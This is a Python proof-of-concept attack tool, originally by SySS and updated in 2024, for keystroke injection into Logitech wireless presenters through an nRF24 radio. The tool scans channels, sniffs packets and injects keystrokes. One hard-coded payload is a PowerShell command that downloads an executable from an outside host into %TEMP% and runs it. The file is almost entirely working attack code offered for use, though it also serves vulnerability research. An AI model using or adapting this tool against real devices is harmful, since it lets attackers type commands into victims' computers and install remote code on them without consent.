#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
  Logitech Wireless Presenter Attack Tool

  by Matthias Deeg <matthias.deeg@syss.de>

  Proof-of-Concept software tool to demonstrate the keystroke injection
  vulnerability of Logitech wireless presenters

  Copyright (C) 2016 SySS GmbH

  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation, either version 3 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program.  If not, see <http://www.gnu.org/licenses/>.
  
  Einstein2150 (Update 2024):
  This program has been migrated and further developed for use with
  Python 3 by Einstein2150. The author acknowledges that ongoing
  enhancements and updates to the codebase may continue in the future.
  Users should be aware that the use of this program is at their own
  risk, and the author accepts no responsibility for any damages that
  may arise from its use. It is the user's responsibility to ensure 
  that their use of the program complies with all applicable laws 
  and regulations.
  

"""

__version__ = '0.9'
__author__ = 'Einstein2150'

import argparse
import logging
import pygame

from binascii import hexlify, unhexlify
from lib import keyboard
from lib import nrf24
from logging import debug, info
from pygame.locals import *
from time import sleep, time
from sys import exit

# constants
ATTACK_VECTOR1 = "cmd"
ATTACK_VECTOR2 = "powershell (new-object System.Net.WebClient).DownloadFile('http://ptmd.sy.gs/syss.exe', '%TEMP%\\syss.exe'); Start-Process '%TEMP%\\syss.exe'"

ATTACK1_BUTTON = pygame.K_1                # attack 1 button
ATTACK2_BUTTON = pygame.K_2                # attack 2 button
SCAN_BUTTON    = pygame.K_3                # scan button

IDLE           = 0                         # idle state
SCAN           = 1                         # scan state
ATTACK         = 2                         # attack state

SCAN_TIME      = 2                         # scan time in seconds for scan mode heuristics
DWELL_TIME     = 0.1                       # dwell time for scan mode in seconds
KEYSTROKE_DELAY = 0.01                     # keystroke delay in seconds
PACKET_THRESHOLD = 3                        # packet threshold for channel stability

# Define the channels you want to scan. Adjust this list based on your requirements.
#SCAN_CHANNELS = [41] 
SCAN_CHANNELS = list(range(2, 84))  # Default range from 2 to 84 (inclusive)

# Logitech Unifying Keep Alive packet with 80 ms
KEEP_ALIVE_80 = unhexlify("0040005070")
KEEP_ALIVE_TIMEOUT = 0.06


class LogitechPresenterAttack():
    """Logitech Wireless Presenter Attack"""

    def __init__(self, address=""):
        """Initialize Logitech Wireless Presenter Attack"""

        self.state = IDLE                           # current state
        self.channel = 2                            # used ShockBurst channel
        self.payloads = []                          # list of sniffed payloads
        self.screen = None                          # screen
        self.font = None                            # font
        self.statusText = ""                        # current status text
        self.address = address                      # set device address
        self.attack_vector = ATTACK_VECTOR1         # set attack vector

        # initialize keyboard
        self.kbd = keyboard.LogitechPresenter()

        try:
            # initialize pygame variables
            pygame.init()
            self.icon = pygame.image.load("./images/syss_logo.png")
            self.bg = pygame.image.load("./images/logitech_presenter_attack_bg.png")

            pygame.display.set_caption("SySS Logitech Presenter Attack PoC")
            pygame.display.set_icon(self.icon)
            self.screen = pygame.display.set_mode((400, 300), 0, 24)
            self.font = pygame.font.SysFont("arial", 24)
            self.screen.blit(self.bg, (0, 0))
            pygame.display.update()

            # set key repetition parameters
            pygame.key.set_repeat(250, 50)

            # initialize radio
            print("[*] Initializing nRF24 radio...")
            self.radio = nrf24.nrf24()  # Change here
            print("[*] nRF24 radio initialized:", self.radio)

            # enable LNA
            self.radio.enable_lna()  # Use self.radio

            # set the initial channel
            self.radio.set_channel(SCAN_CHANNELS[0])  # Use self.radio

            # start scanning mode
            self.setState(SCAN)
        except Exception as e:
            # info output
            info("[-] Error: Could not initialize Logitech Wireless Presenter Attack: {}".format(e))


    def showText(self, text, x=40, y=140):
        output = self.font.render(text, True, (0, 0, 0))
        self.screen.blit(output, (x, y))


    def setState(self, newState):
        """Set state"""

        if newState == SCAN:
            # set SCAN state
            self.state = SCAN
            self.statusText = "SCANNING"
        elif newState == ATTACK:
            # set ATTACK state
            self.state = ATTACK
            self.statusText = "ATTACKING"
        else:
            # set IDLE state
            self.state = IDLE
            self.statusText = "IDLING"

    def run(self):
        # main loop
        last_keep_alive = time()
        running = True
        while running:
            for i in pygame.event.get():
                if i.type == QUIT:
                    running = False

                elif i.type == KEYDOWN:
                    if i.key == K_ESCAPE:
                        running = False

                    # scan button state transitions
                    if i.key == SCAN_BUTTON:
                        # if the current state is IDLE change it to SCAN
                        if self.state == IDLE:
                            # set SCAN state
                            self.setState(SCAN)

                    # attack button state transitions
                    if i.key == ATTACK1_BUTTON:
                        # if the current state is IDLE change it to ATTACK
                        if self.state == IDLE:
                            # set ATTACK state
                            self.setState(ATTACK)

                            # set attack vector
                            self.attack_vector = ATTACK_VECTOR1

                    # attack button state transitions
                    if i.key == ATTACK2_BUTTON:
                        # if the current state is IDLE change it to ATTACK
                        if self.state == IDLE:
                            # set ATTACK state
                            self.setState(ATTACK)

                            # set attack vector
                            self.attack_vector = ATTACK_VECTOR2

            # show current status on screen
            self.screen.blit(self.bg, (0, 0))
            self.showText(self.statusText)

            # update the display
            pygame.display.update()

            # state machine
            if self.state == SCAN:
                info("Scan for nRF24 device")

                # put the radio in promiscuous mode (without address) or into
                # sniffer mode(with address)
                if len(self.address) > 0:
                    self.radio.enter_sniffer_mode(self.address)
                else:
                    self.radio.enter_promiscuous_mode()

                # set the initial channel
                self.radio.set_channel(SCAN_CHANNELS[0])
                channel_index = 0

                if len(self.address) > 0:
                    # actively search for the given address
                    address_string = ':'.join('{:02X}'.format(b) for b in self.address)
                    info("Actively searching for address {}".format(address_string))
                    last_ping = time()

                    # init variables with default values from nrf24-sniffer.py
                    timeout = 0.1
                    ping_payload = unhexlify('0F0F0F0F')
                    ack_timeout = 250  # range: 250-40000, steps: 250
                    ack_timeout = int(ack_timeout / 250) - 1
                    retries = 1  # range: 0-15
                    while True:
                        # follow the target device if it changes channels
                        if time() - last_ping > timeout:
                            # First try pinging on the active channel
                            if not self.radio.transmit_payload(ping_payload, ack_timeout, retries):
                                # Ping failed on the active channel, so sweep through all available channels
                                success = False
                                for channel_index in range(len(SCAN_CHANNELS)):
                                    self.radio.set_channel(SCAN_CHANNELS[channel_index])
                                    if self.radio.transmit_payload(ping_payload, ack_timeout, retries):
                                        # Ping successful, exit out of the ping sweep
                                        last_ping = time()
                                        info("Ping success on channel {}".format(SCAN_CHANNELS[channel_index]))
                                        success = True
                                        break
                                # Ping sweep failed
                                if not success:
                                    info("Unable to ping {}".format(address_string))
                            # Ping succeeded on the active channel
                            else:
                                info("Ping success on channel {}".format(SCAN_CHANNELS[channel_index]))
                                last_ping = time()

                        # Receive payloads
                        value = self.radio.receive_payload()
                        if value[0] == 0:
                            # Reset the channel timer
                            last_ping = time()
                            # Split the payload from the status byte
                            payload = value[1:]
                            if len(payload) >= 5:
                                last_key = time()
                                break
                else:
                    # sweep through the channels and decode ESB packets in pseudo-promiscuous mode
                    info("Scanning for Logitech wireless presenter ...")
                    last_tune = time()
                    while True:
                        # increment the channel
                        if len(SCAN_CHANNELS) > 1 and time() - last_tune > DWELL_TIME:
                            channel_index = (channel_index + 1) % len(SCAN_CHANNELS)
                            self.radio.set_channel(SCAN_CHANNELS[channel_index])
                            last_tune = time()
                            info("Tuned to channel {}".format(SCAN_CHANNELS[channel_index]))

                        # Receive payloads
                        value = self.radio.receive_payload()
                        if value[0] == 0:
                            # Reset the channel timer
                            last_tune = time()
                            # Split the payload from the status byte
                            payload = value[1:]
                            # store the payload
                            self.payloads.append(payload)
                            # perform the attack if the packet threshold is reached
                            if len(self.payloads) > PACKET_THRESHOLD:
                                info("Received {} packets. Executing attack...".format(len(self.payloads)))
                                # execute attack
                                self.executeAttack()
                                break

                # set the state to idle after scanning
                self.setState(IDLE)

            elif self.state == ATTACK:
                # prepare payload for attack
                self.kbd.send(self.attack_vector)

                # wait for a while
                sleep(KEYSTROKE_DELAY)

                # set the state to idle after attacking
                self.setState(IDLE)

            # keep alive
            if time() - last_keep_alive > KEEP_ALIVE_TIMEOUT:
                #self.radio.send(KEEP_ALIVE_80)
                self.radio.transmit_payload(KEEP_ALIVE_80)
                last_keep_alive = time()

        # clean up
        pygame.quit()
        exit(0)


    def executeAttack(self):
        """Execute the attack by sending payloads"""
        # check if any payloads were stored
        if len(self.payloads) > 0:
            # loop over the stored payloads
            for payload in self.payloads:
                # log the payload
                debug("Sending payload {}".format(hexlify(payload)))

                # prepare the keyboard payload
                self.kbd.send(payload)

                # wait for a while
                sleep(KEYSTROKE_DELAY)


def main():
    """Main function"""
    # configure logging
    logging.basicConfig(level=logging.DEBUG, format="%(asctime)s [%(levelname)-8s] %(message)s")

    # initialize argument parser
    parser = argparse.ArgumentParser(description="Logitech Wireless Presenter Attack Tool")
    parser.add_argument("-a", "--address", type=str, default="", help="Specify the target device address")
    args = parser.parse_args()

    # start Logitech Wireless Presenter Attack
    LogitechPresenterAttack(args.address).run()


if __name__ == "__main__":
    main()
